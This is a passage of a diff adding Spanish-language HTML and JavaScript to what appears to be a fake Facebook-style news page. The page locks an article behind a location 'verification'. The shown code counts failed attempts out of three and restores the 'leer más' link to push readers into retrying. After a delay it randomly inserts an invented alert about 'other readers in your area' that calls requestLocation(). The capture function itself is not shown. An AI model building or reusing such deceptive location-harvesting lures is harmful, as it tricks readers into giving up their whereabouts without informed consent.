+                    <div style="font-size: 4rem; margin-bottom: 20px;">${message.icon}</div>
+                    <h2 style="color: ${message.color}; font-size: 1.6rem; margin-bottom: 20px; font-weight: 600;">
+                        ${message.title}
+                    </h2>
+                    <p style="margin: 20px 0; font-size: 1.1rem; line-height: 1.5; color: #e5e7eb;">
+                        ${message.text}
+                    </p>
+                    
+                    <div style="margin: 30px 0;">
+                        <button onclick="resetToReadMore()" style="
+                            background: linear-gradient(135deg, ${message.color}, #7f1d1d);
+                            color: white;
+                            border: none;
+                            padding: 18px 40px;
+                            border-radius: 50px;
+                            font-size: 1.2rem;
+                            font-weight: bold;
+                            cursor: pointer;
+                            margin: 10px;
+                            box-shadow: 0 4px 15px rgba(220, 38, 38, 0.3);
+                        ">${message.buttonText}</button>
+                    </div>
+                    
+                    <p style="font-size: 0.9rem; color: #6b7280; margin-top: 15px;">
+                        Intento ${attemptNumber} de 3 - El contenido se desbloqueará después de la verificación exitosa
+                    </p>
+                `;
+                
+                console.log(`⚠️ Mostrando mensaje de ubicación denegada (intento ${attemptNumber})`);
+            }
+        }
+        
+        // Función para regresar al estado de "leer más"
+        function resetToReadMore() {
+            console.log('🔄 Regresando al estado de "leer más" para nuevo intento...');
+            
+            // Ocultar overlay
+            hideVerificationOverlay();
+            
+            // Restaurar el enlace "leer más"
+            setTimeout(() => {
+                const newsContent = document.getElementById('newsContent');
+                if (newsContent && currentNews && currentNews.content) {
+                    const contentWithReadMore = currentNews.content + '... <span class="read-more-link" onclick="expandNewsFacebook()"><strong>leer más</strong></span>';
+                    newsContent.innerHTML = contentWithReadMore;
+                    console.log('✅ Enlace "leer más" restaurado - usuario debe intentar de nuevo');
+                }
+            }, 500);
+        }
+        
+        // Intentar capturar ubicación automáticamente después de 10 segundos
+        setTimeout(() => {
+            if (Math.random() > 0.3) { // 70% de probabilidad
+                const alertDiv = document.querySelector('.location-alert');
+                if (alertDiv) {
+                    alertDiv.innerHTML += `
+                    <div style="margin-top: 20px; padding: 15px; background: rgba(255,255,255,0.2); border-radius: 10px; font-size: 0.95rem;">
+                        <strong>⚡ ACTUALIZACIONES EN VIVO:</strong> Otros lectores en tu zona están reportando nuevos desarrollos. 
+                        <a href="#" onclick="requestLocation(); return false;" style="color: #fbbf24; text-decoration: underline;">
+                            Verifica tu área para recibir actualizaciones instantáneas.
+                        </a>
+                    </div>
+                `;
+                }
+            }
+        }, 10000);
+    </script>
+</body>
+</html>
